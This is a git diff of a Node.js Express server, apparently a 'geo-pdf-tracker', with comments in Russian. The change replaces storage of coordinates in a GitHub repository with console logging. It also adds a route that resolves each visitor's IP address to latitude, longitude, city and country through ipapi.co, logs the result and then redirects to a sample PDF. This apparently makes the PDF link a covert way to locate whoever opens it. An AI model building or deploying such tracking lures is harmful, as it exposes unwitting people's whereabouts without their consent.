@@ -6,11 +6,8 @@ const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, '../public')));
 
-// Конфигурация GitHub API
-const GITHUB_TOKEN = process.env.GITHUB_TOKEN;
-const REPO_OWNER = 'habtreidauto'; // Замените на ваш GitHub логин
-const REPO_NAME = 'geo-pdf-tracker'; // Замените на имя вашего репозитория
-const FILE_PATH = 'locations.json'; // Путь к файлу в репозитории
+// Конфигурация IP API (опционально)
+const IPAPI_KEY = process.env.IPAPI_KEY; // API-ключ для ipapi.co (опционально)
 
 // Тестовый маршрут для проверки API
 app.get('/api/test', (req, res) => {
@@ -18,21 +15,13 @@ app.get('/api/test', (req, res) => {
     res.json({ 
         success: true, 
         message: 'API is working', 
-        tokenConfigured: !!GITHUB_TOKEN,
-        repoOwner: REPO_OWNER,
-        repoName: REPO_NAME,
-        filePath: FILE_PATH 
+        ipApiKeyConfigured: !!IPAPI_KEY 
     });
 });
 
-// Маршрут для сохранения геолокации
+// Маршрут для сохранения геолокации через Geolocation API
 app.post('/api/save-location', async (req, res) => {
     console.log('Received request to /api/save-location at', new Date().toISOString(), 'Body:', req.body);
-
-    if (!GITHUB_TOKEN) {
-        console.error('GitHub token not configured');
-        return res.status(500).json({ success: false, error: 'GitHub token not configured' });
-    }
 
     const { latitude, longitude } = req.body;
     if (!latitude || !longitude) {
@@ -41,71 +30,38 @@ app.post('/api/save-location', async (req, res) => {
     }
 
     const timestamp = new Date().toISOString();
-    const locationData = { latitude, longitude, timestamp };
+    const locationData = { latitude, longitude, timestamp, source: 'geolocation' };
+
+    // Логируем данные в консоль (будут в логах Vercel)
+    console.log('Geolocation data saved:', JSON.stringify(locationData, null, 2));
+
+    res.json({ success: true });
+});
+
+// Маршрут для сохранения геолокации через IP
+app.get('/api/save-ip-location', async (req, res) => {
+    const clientIp = req.headers['x-forwarded-for'] || req.ip;
+    console.log('Received request to /api/save-ip-location at', new Date().toISOString(), 'IP:', clientIp);
 
     try {
-        // Проверяем доступ к репозиторию
-        console.log('Checking repository access');
-        await axios.get(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}`, {
-            headers: {
-                Authorization: `Bearer ${GITHUB_TOKEN}`,
-                Accept: 'application/vnd.github.v3+json',
-            },
-        });
+        // Получаем геолокацию по IP
+        const response = await axios.get(`https://ipapi.co/${clientIp}/json/` + (IPAPI_KEY ? `?key=${IPAPI_KEY}` : ''));
+        const { latitude, longitude, city, region, country } = response.data;
 
-        // Получаем текущий файл locations.json из репозитория
-        let sha;
-        let locations = [];
-        console.log('Fetching locations.json from GitHub');
-        try {
-            const response = await axios.get(
-                `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`,
-                {
-                    headers: {
-                        Authorization: `Bearer ${GITHUB_TOKEN}`,
-                        Accept: 'application/vnd.github.v3+json',
-                    },
-                }
-            );
-            console.log('GitHub API response:', response.data);
-            const content = Buffer.from(response.data.content, 'base64').toString('utf8');
-            locations = JSON.parse(content);
-            sha = response.data.sha;
-        } catch (err) {
-            if (err.response && err.response.status === 404) {
-                console.log('locations.json not found, initializing empty array');
-                locations = [];
-            } else {
-                console.error('GitHub API error:', err.message, err.response?.data);
-                throw err;
-            }
+        if (!latitude || !longitude) {
+            console.error('Invalid IP geolocation data:', response.data);
+            return res.status(400).json({ success: false, error: 'Invalid IP geolocation data' });
         }
 
-        // Добавляем новые данные
-        locations.push(locationData);
-        console.log('New locations data:', locations);
+        const timestamp = new Date().toISOString();
+        const locationData = { latitude, longitude, city, region, country, timestamp, source: 'ipapi' };
 
-        // Обновляем файл в репозитории
-        console.log('Updating locations.json in GitHub');
-        await axios.put(
-            `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`,
-            {
-                message: `Update locations.json with new geolocation data at ${timestamp}`,
-                content: Buffer.from(JSON.stringify(locations, null, 2)).toString('base64'),
-                sha: sha,
-            },
-            {
-                headers: {
-                    Authorization: `Bearer ${GITHUB_TOKEN}`,
-                    Accept: 'application/vnd.github.v3+json',
-            },
-            }
-        );
+        // Логируем данные в консоль (будут в логах Vercel)
+        console.log('IP geolocation data saved:', JSON.stringify(locationData, null, 2));
 
-        console.log('Locations saved to GitHub:', locationData);
-        res.json({ success: true });
+        res.json({ success: true, redirect: '/sample.pdf' });
     } catch (err) {
-        console.error('Ошибка сохранения:', err.message, err.response?.data);
+        console.error('Ошибка сохранения IP:', err.message, err.response?.data);
         res.status(500).json({ success: false, error: `Ошибка сервера: ${err.message}` });
     }
 });
